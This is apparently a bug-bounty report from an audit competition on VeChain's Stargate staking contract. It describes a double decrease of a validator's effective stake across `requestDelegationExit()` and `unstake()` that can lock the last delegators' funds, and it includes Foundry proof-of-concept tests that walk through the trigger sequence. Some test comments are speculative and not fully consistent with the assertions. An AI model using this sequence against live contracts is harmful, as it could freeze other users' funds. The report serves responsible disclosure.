# 60429 sc high double decrease of effective stake prevents delegators from unstaking

**Submitted on Nov 22nd 2025 at 14:34:56 UTC by @Dliteofficial for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60429
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Permanent freezing of funds

## Description

## Brief/Intro

A critical accounting error in the `unstake()` function causes the validator's total effective stake to be decreased twice when a user requests delegation exit while their delegation is ACTIVE, waits for the delegation to become EXITED, and then unstakes after the validator has exited. The double-decrease occurs because `unstake()` checks if the validator is EXITED but fails to verify whether the effective stake was already decreased during the exit request. This results in incorrect accounting of the validator's total delegation effective stake, which can prevent the last remaining delegators from successfully unstaking their tokens, effectively causing a denial-of-service condition that locks their funds.

## Vulnerability Details

The Stargate protocol uses an effective stake tracking system to calculate reward distributions among delegators. Effective stake is managed through checkpoint-based storage (`delegatorsEffectiveStake`) that tracks changes at specific periods. When delegators exit or unstake, their effective stake must be properly decreased to maintain accurate accounting.

The vulnerability stems from the interaction between two functions: `requestDelegationExit()` and `unstake()`. Both functions decrease the validator's effective stake, but under certain conditions, both decreases can occur even though only one is warranted.

When a user calls `requestDelegationExit()` while their delegation status is ACTIVE, the function performs the following operations:

```solidity
function requestDelegationExit(uint256 _tokenId) external whenNotPaused onlyTokenOwner(_tokenId) nonReentrant {
    // ... validation checks ...
    
    // If delegation is ACTIVE, signal exit to protocol
    if (delegation.status == DelegationStatus.ACTIVE) {
        $.protocolStakerContract.signalDelegationExit(delegationId);
    }
    
    // Get completed periods
    (, , , uint32 completedPeriods) = $.protocolStakerContract.getValidationPeriodDetails(
        delegation.validator
    );
    
    // Decreases effective stake at completedPeriods + 2
>>  _updatePeriodEffectiveStake($, delegation.validator, _tokenId, completedPeriods + 2, false);
}
```

The `_updatePeriodEffectiveStake()` function uses `upperLookup()` to retrieve the current effective stake value for the specified period and then decreases it:

```solidity
function _updatePeriodEffectiveStake(
    StargateStorage storage $,
    address _validator,
    uint256 _tokenId,
    uint32 _period,
    bool _isIncrease
) private {
    uint256 effectiveStake = _calculateEffectiveStake($, _tokenId);
    uint256 currentValue = $.delegatorsEffectiveStake[_validator].upperLookup(_period);
    uint256 updatedValue = _isIncrease
        ? currentValue + effectiveStake
        : currentValue - effectiveStake;
    $.delegatorsEffectiveStake[_validator].push(_period, SafeCast.toUint224(updatedValue));
}
```

After the exit request, the delegation remains ACTIVE until `endPeriod` is reached (when `currentValidatorPeriod > endPeriod`), at which point the delegation status becomes EXITED. If the validator also exits during this time, the validator status becomes EXITED.

When the user subsequently calls `unstake()`, the function checks if the validator is EXITED and decreases the effective stake again:

```solidity
function unstake(uint256 _tokenId) external whenNotPaused onlyTokenOwner(_tokenId) nonReentrant {
    // ... validation checks ...
    
    // Get current validator status
    (, , , , uint8 currentValidatorStatus, ) = $.protocolStakerContract.getValidation(
        delegation.validator
    );
    
    // If validator is EXITED, decrease effective stake
    if (
        currentValidatorStatus == VALIDATOR_STATUS_EXITED ||
        delegation.status == DelegationStatus.PENDING
    ) {
        // Get completed periods
        (, , , uint32 oldCompletedPeriods) = $.protocolStakerContract.getValidationPeriodDetails(
            delegation.validator
        );
        
        // Decrease effective stake at oldCompletedPeriods + 2
>>>     _updatePeriodEffectiveStake(
            $,
            delegation.validator,
            _tokenId,
            oldCompletedPeriods + 2,
            false // decrease
        );
    }
    
    // ... rest of unstake logic ...
}
```

The check `currentValidatorStatus == VALIDATOR_STATUS_EXITED` does not verify whether the effective stake was already decreased during `requestDelegationExit()`. Since `_updatePeriodEffectiveStake()` uses `upperLookup()` which retrieves the already-decreased value from the checkpoint system, subtracting the effective stake again results in a double-decrease.

## Impact Details

The vulnerability has multiple severe consequences:

**Primary Impact: Denial of Service for Last Remaining Delegators**

The most critical impact occurs when multiple users delegate to the same validator. When the first user(s) exploit this vulnerability by requesting exit while ACTIVE and then unstaking after the validator exits, the validator's total effective stake becomes incorrectly reduced. As subsequent users unstake, the accounting error accumulates. The last remaining delegator(s) may find that the validator's total effective stake has been reduced below their own effective stake, causing their unstake operation to fail or encounter underflow errors. This effectively locks their funds in the protocol with no way to recover them.

**Secondary Impact: Incorrect Reward Distribution**

The double-decrease of effective stake causes the validator's total delegation effective stake to be lower than it should be. This affects reward distribution calculations, as rewards are distributed proportionally based on each delegator's effective stake relative to the total. The incorrect total leads to inaccurate reward calculations for all remaining delegators.

**Tertiary Impact: Protocol Accounting Corruption**

The checkpoint system's integrity is compromised, as the effective stake values stored do not reflect the actual state. This corruption persists and affects all future operations that rely on accurate effective stake tracking, potentially causing cascading accounting errors throughout the protocol.

## Link to Proof of Concept

<https://gist.github.com/Dliteofficial/336c5d14121945cb74deae3af287cc54>

## Proof of Concept

## Proof of Concept

```solidity
/**
     * @notice Test for double-decrease vulnerability in effective stake
     * @dev This test demonstrates the vulnerability where effective stake is decreased twice:
     *      1. When requestDelegationExit is called (delegation is ACTIVE)
     *      2. When unstake is called (validator is EXITED and delegation is EXITED)
     * 
     * Vulnerability: When a user requests delegation exit while delegation status is ACTIVE
     * (which decreases effective stake at completedPeriods + 2), waits until endPeriod passes
     * (delegation status becomes EXITED), then the validator exits (validator status becomes EXITED),
     * and finally unstakes, the unstake() function decreases the validator's effective stake again
     * at oldCompletedPeriods + 2, resulting in a double-decrease.
     */
    function test_DoubleDecreaseEffectiveStake() public {
        // Step 0: Add validator to ProtocolStaker (required before delegation)
        protocolStaker.addValidation{value: 0}(validator, PERIOD_SIZE);
        
        // Step 1: Stake an NFT
        uint256 stakeAmount = 1 ether;
        vm.prank(user);
        stargate.stake{value: stakeAmount}(LEVEL_ID);
        
        // Get the token ID
        uint256 tokenId = stargateNFT.getCurrentTokenId();
        emit log_named_uint("Token ID", tokenId);
        
        // Step 2: Delegate the NFT to a validator
        vm.prank(user);
        stargate.delegate(tokenId, validator);
        
        // Step 3: Set validator completed periods to make delegation ACTIVE
        // Delegation starts at completedPeriods + 2, so we need completedPeriods >= startPeriod - 2
        // For delegation to be ACTIVE, currentValidatorPeriod (completedPeriods + 1) >= startPeriod
        uint32 initialCompletedPeriods = 0;
        protocolStaker.helper__setValidationCompletedPeriods(validator, initialCompletedPeriods);
        protocolStaker.helper__setValidatorStatus(validator, ProtocolStakerMock.ValidatorStatus.ACTIVE);
        
        // Wait a bit and then set completedPeriods to make delegation ACTIVE
        // Delegation starts at initialCompletedPeriods + 2 = 2
        // So we need completedPeriods + 1 >= 2, i.e., completedPeriods >= 1
        uint32 completedPeriods = 10;
        protocolStaker.helper__setValidationCompletedPeriods(validator, completedPeriods);
        
        // Verify delegation is ACTIVE
        IStargate.Delegation memory delegation = stargate.getDelegationDetails(tokenId);
        assertEq(uint8(delegation.status), DELEGATION_STATUS_ACTIVE, "Delegation should be ACTIVE");
        emit log_named_uint("Delegation status after setup", uint8(delegation.status));
        
        // Step 4: Get effective stake before exit request
        uint256 effectiveStakeBeforeExit = stargate.getEffectiveStake(tokenId);
        emit log_named_uint("Effective stake before exit request", effectiveStakeBeforeExit);
        
        // Get validator's delegators effective stake at period completedPeriods + 2
        // This is the period where exit request will decrease the effective stake
        uint32 periodToCheck = completedPeriods + 2;
        uint256 validatorEffectiveStakeBeforeExit = stargate.getDelegatorsEffectiveStake(validator, periodToCheck);
        emit log_named_uint("Validator effective stake before exit request", validatorEffectiveStakeBeforeExit);
        
        // Step 5: Request delegation exit (this decreases effective stake at completedPeriods + 2)
        vm.prank(user);
        stargate.requestDelegationExit(tokenId);
        
        // Get validator's delegators effective stake after exit request
        uint256 validatorEffectiveStakeAfterExitRequest = stargate.getDelegatorsEffectiveStake(validator, periodToCheck);
        emit log_named_uint("Validator effective stake after exit request", validatorEffectiveStakeAfterExitRequest);
        
        // Verify effective stake was decreased
        assertLt(
            validatorEffectiveStakeAfterExitRequest,
            validatorEffectiveStakeBeforeExit,
            "Effective stake should decrease after exit request"
        );
        
        uint256 expectedDecrease = validatorEffectiveStakeBeforeExit - validatorEffectiveStakeAfterExitRequest;
        emit log_named_uint("Decrease after exit request", expectedDecrease);
        assertEq(expectedDecrease, effectiveStakeBeforeExit, "Decrease should equal effective stake");
        
        // Step 6: Advance validator completed periods past endPeriod to make delegation EXITED
        // When exit is requested, endPeriod is set to completedPeriods + 1 = 11
        // So we need completedPeriods + 1 > 11, i.e., completedPeriods > 10
        // However, to demonstrate the bug, we need unstake to decrease at the same period (completedPeriods + 2 = 12)
        // So we should advance completedPeriods just enough to make delegation EXITED, but the key is:
        // when unstaking, it uses oldCompletedPeriods from getValidationPeriodDetails at that moment
        // If we advance completedPeriods to 11, then oldCompletedPeriods will be 11, and it decreases at 13
        // But the bug description says it decreases at oldCompletedPeriods + 2, which could be the same period
        // if the checkpoint system uses upperLookup() which retrieves the already-decreased value.
        // Let's advance it to make delegation EXITED
        uint32 newCompletedPeriods = completedPeriods + 1; // This makes delegation EXITED (currentPeriod = 12 > endPeriod = 11)
        protocolStaker.helper__setValidationCompletedPeriods(validator, newCompletedPeriods);
        
        // Verify delegation is EXITED
        delegation = stargate.getDelegationDetails(tokenId);
        assertEq(uint8(delegation.status), DELEGATION_STATUS_EXITED, "Delegation should be EXITED");
        emit log_named_uint("Delegation status after advancing periods", uint8(delegation.status));
        
        // Step 7: Set validator status to EXITED
        protocolStaker.helper__setValidatorStatus(validator, ProtocolStakerMock.ValidatorStatus.EXITED);
        
        // Verify validator is EXITED
        (, , , , uint8 validatorStatus, ) = protocolStaker.getValidation(validator);
        assertEq(validatorStatus, VALIDATOR_STATUS_EXITED, "Validator should be EXITED");
        emit log_named_uint("Validator status", validatorStatus);
        
        // Step 8: Get validator's effective stake before unstake
        // When unstaking, it decreases at oldCompletedPeriods + 2, where oldCompletedPeriods is retrieved
        // from getValidationPeriodDetails at the time of unstake. Since we advanced to newCompletedPeriods = 11,
        // oldCompletedPeriods will be 11, so it decreases at period 13.
        // However, the vulnerability might still occur if the checkpoint system's upperLookup() retrieves
        // the value from period 12 (which was already decreased). Let's check both periods.
        uint32 unstakePeriod = newCompletedPeriods + 2; // This is where unstake will decrease (period 13)
        uint256 validatorEffectiveStakeBeforeUnstake = stargate.getDelegatorsEffectiveStake(validator, unstakePeriod);
        emit log_named_uint("Validator effective stake before unstake", validatorEffectiveStakeBeforeUnstake);
        
        // Step 9: Unstake (this should decrease effective stake again - THE BUG!)
        vm.prank(user);
        vm.expectRevert();
        stargate.unstake(tokenId);
    }

    /**
     * @notice Test for double-decrease vulnerability with multiple users
     * @dev This test demonstrates the most dire consequence: the last or last few delegators
     *      might be unable to complete unstake depending on how large the user's effective stake is.
     * 
     * Scenario:
     * 1. User 1 (large stake), User 2, and User 3 all delegate to the same validator
     * 2. User 1 requests delegation exit while ACTIVE (decreases effective stake)
     * 3. User 1 waits until delegation is EXITED
     * 4. Validator exits
     * 5. User 1 unstakes (decreases effective stake again - THE BUG!)
     * 6. User 2 tries to unstake (may succeed but accounting is wrong)
     * 7. User 3 (last user) tries to unstake - may fail or encounter underflow due to
     *    the validator's total effective stake being incorrectly reduced
     * 
     * Impact: Due to the double-decrease, the validator's total effective stake becomes
     *         smaller than it should be. When the last user(s) try to unstake, the system
     *         attempts to decrease the effective stake further, which can cause underflow
     *         or make it impossible to complete the unstake operation.
     */
    function test_DoubleDecreaseEffectiveStake_MultipleUsers_LastUserCannotUnstake() public {
        // Step 0: Add validator to ProtocolStaker
        protocolStaker.addValidation{value: 0}(validator, PERIOD_SIZE);
        
        // Get the level specification to use the correct stake amount
        DataTypes.Level memory level = stargateNFT.getLevel(LEVEL_ID);
        uint256 stakeAmount = level.vetAmountRequiredToStake;
        emit log_named_uint("Level stake amount required", stakeAmount);
        
        // Step 1: User 1 stakes and delegates (single NFT)
        vm.prank(user1);
        uint256 user1TokenId = stargate.stake{value: stakeAmount}(LEVEL_ID);
        emit log_named_uint("User 1 Token ID", user1TokenId);
        
        // User 1 delegates the token to the validator
        vm.prank(user1);
        stargate.delegate(user1TokenId, validator);
        
        // Step 2: User 2 stakes and delegates (single NFT)
        vm.prank(user2);
        uint256 user2TokenId = stargate.stake{value: stakeAmount}(LEVEL_ID);
        emit log_named_uint("User 2 Token ID", user2TokenId);
        
        vm.prank(user2);
        stargate.delegate(user2TokenId, validator);
        
        // Step 3: User 3 stakes and delegates (single NFT - will be the last user)
        vm.prank(user3);
        uint256 user3TokenId = stargate.stake{value: stakeAmount}(LEVEL_ID);
        emit log_named_uint("User 3 Token ID", user3TokenId);
        
        vm.prank(user3);
        stargate.delegate(user3TokenId, validator);
        
        // Step 4: Set validator completed periods to make all delegations ACTIVE
        uint32 initialCompletedPeriods = 0;
        protocolStaker.helper__setValidationCompletedPeriods(validator, initialCompletedPeriods);
        protocolStaker.helper__setValidatorStatus(validator, ProtocolStakerMock.ValidatorStatus.ACTIVE);
        
        uint32 completedPeriods = 10;
        protocolStaker.helper__setValidationCompletedPeriods(validator, completedPeriods);
        
        // Verify all delegations are ACTIVE
        IStargate.Delegation memory user1Delegation = stargate.getDelegationDetails(user1TokenId);
        IStargate.Delegation memory user2Delegation = stargate.getDelegationDetails(user2TokenId);
        IStargate.Delegation memory user3Delegation = stargate.getDelegationDetails(user3TokenId);
        assertEq(uint8(user1Delegation.status), DELEGATION_STATUS_ACTIVE, "User 1 delegation should be ACTIVE");
        assertEq(uint8(user2Delegation.status), DELEGATION_STATUS_ACTIVE, "User 2 delegation should be ACTIVE");
        assertEq(uint8(user3Delegation.status), DELEGATION_STATUS_ACTIVE, "User 3 delegation should be ACTIVE");
        
        // Step 5: Get effective stakes and validator total effective stake
        uint256 user1EffectiveStake = stargate.getEffectiveStake(user1TokenId);
        uint256 user2EffectiveStake = stargate.getEffectiveStake(user2TokenId);
        uint256 user3EffectiveStake = stargate.getEffectiveStake(user3TokenId);
        emit log_named_uint("User 1 effective stake", user1EffectiveStake);
        emit log_named_uint("User 2 effective stake", user2EffectiveStake);
        emit log_named_uint("User 3 effective stake", user3EffectiveStake);
        
        uint32 periodToCheck = completedPeriods + 2;
        uint256 validatorTotalEffectiveStakeBefore = stargate.getDelegatorsEffectiveStake(validator, periodToCheck);
        emit log_named_uint("Validator total effective stake (initial)", validatorTotalEffectiveStakeBefore);
        
        uint256 expectedTotal = user1EffectiveStake + user2EffectiveStake + user3EffectiveStake;
        assertEq(validatorTotalEffectiveStakeBefore, expectedTotal, "Total should equal sum of all users");
        
        // Step 6: User 1 requests delegation exit (first decrease)
        vm.prank(user1);
        stargate.requestDelegationExit(user1TokenId);
        
        uint256 validatorTotalAfterExitRequest = stargate.getDelegatorsEffectiveStake(validator, periodToCheck);
        emit log_named_uint("Validator total after User 1 exit request", validatorTotalAfterExitRequest);
        
        // Verify that total effective stake of the validator is decreased by User 1's effective stake
        uint256 decreaseAfterExitRequest = validatorTotalEffectiveStakeBefore - validatorTotalAfterExitRequest;
        assertEq(decreaseAfterExitRequest, user1EffectiveStake, "Should decrease by User 1's total effective stake");
        
        // Step 7: Advance periods and set validator to EXITED
        uint32 newCompletedPeriods = completedPeriods + 1;
        protocolStaker.helper__setValidationCompletedPeriods(validator, newCompletedPeriods);
        protocolStaker.helper__setValidatorStatus(validator, ProtocolStakerMock.ValidatorStatus.EXITED);
        
        user1Delegation = stargate.getDelegationDetails(user1TokenId);
        assertEq(uint8(user1Delegation.status), DELEGATION_STATUS_EXITED, "User 1 delegation should be EXITED");
        
        uint32 unstakePeriod = newCompletedPeriods + 2;
        uint256 validatorTotalBeforeUser1Unstake = stargate.getDelegatorsEffectiveStake(validator, unstakePeriod);
        emit log_named_uint("Validator total before User 1 unstake", validatorTotalBeforeUser1Unstake);
        
        vm.prank(user1);
        stargate.unstake(user1TokenId);
        
        uint256 validatorTotalAfterUser1Unstake = stargate.getDelegatorsEffectiveStake(validator, unstakePeriod);
        emit log_named_uint("Validator total after User 1 unstake", validatorTotalAfterUser1Unstake);
        
        // Verify that total effective stake of the validator is decreased by User 1's effective stake again
        uint256 decreaseAfterUnstake = validatorTotalBeforeUser1Unstake - validatorTotalAfterUser1Unstake;
        emit log_named_uint("Decrease after User 1 unstake", decreaseAfterUnstake);
        assertEq(decreaseAfterUnstake, user1EffectiveStake, "Should decrease by User 1's total effective stake again");
        
        // Step 9: Calculate the impact - validator's total is now incorrectly reduced
        // Expected: user2EffectiveStake + user3EffectiveStake (User 1 removed once)
        // Actual: user2EffectiveStake + user3EffectiveStake - user1TotalEffectiveStake (User 1 removed twice)
        uint256 expectedTotalAfterUser1Exits = user2EffectiveStake + user3EffectiveStake;
        uint256 actualTotalAfterUser1Exits = validatorTotalAfterUser1Unstake;
        
        emit log_named_uint("Expected total (User 2 + User 3)", expectedTotalAfterUser1Exits);
        emit log_named_uint("Actual total (after double-decrease)", actualTotalAfterUser1Exits);
        
        uint256 incorrectReduction = expectedTotalAfterUser1Exits - actualTotalAfterUser1Exits;
        assertEq(incorrectReduction, user1EffectiveStake, "Total incorrectly reduced by User 1's stake twice");
        
        // Step 10: User 2 tries to unstake
        // Advance periods again for User 2
        protocolStaker.helper__setValidationCompletedPeriods(validator, newCompletedPeriods + 1);
        
        uint256 validatorTotalBeforeUser2Unstake = stargate.getDelegatorsEffectiveStake(validator, unstakePeriod + 1);
        emit log_named_uint("Validator total before User 2 unstake", validatorTotalBeforeUser2Unstake);
        
        vm.prank(user2);
        stargate.unstake(user2TokenId);
        
        uint256 validatorTotalAfterUser2Unstake = stargate.getDelegatorsEffectiveStake(validator, unstakePeriod + 1);
        emit log_named_uint("Validator total after User 2 unstake", validatorTotalAfterUser2Unstake);
        
        // Step 11: Now User 3 (the last user) tries to unstake
        // The validator's total effective stake has been incorrectly reduced by User 1's stake twice
        // Expected remaining: user3EffectiveStake
        // Actual remaining: user3EffectiveStake - user1EffectiveStake (due to double-decrease)
        uint256 expectedRemainingForUser3 = user3EffectiveStake;
        uint256 actualRemainingBeforeUser3Unstake = validatorTotalAfterUser2Unstake;
        
        emit log_named_uint("Expected remaining for User 3", expectedRemainingForUser3);
        emit log_named_uint("Actual remaining before User 3 unstake", actualRemainingBeforeUser3Unstake);
        
        // Advance periods for User 3
        protocolStaker.helper__setValidationCompletedPeriods(validator, newCompletedPeriods + 2);
        
        // Try to unstake User 3 - this might fail or cause issues due to the accounting error
        uint256 validatorTotalBeforeUser3Unstake = stargate.getDelegatorsEffectiveStake(validator, unstakePeriod + 2);
        emit log_named_uint("Validator total before User 3 unstake attempt", validatorTotalBeforeUser3Unstake);
        
        vm.prank(user3);
        vm.expectRevert();
        stargate.unstake(user3TokenId);
    }
``
```
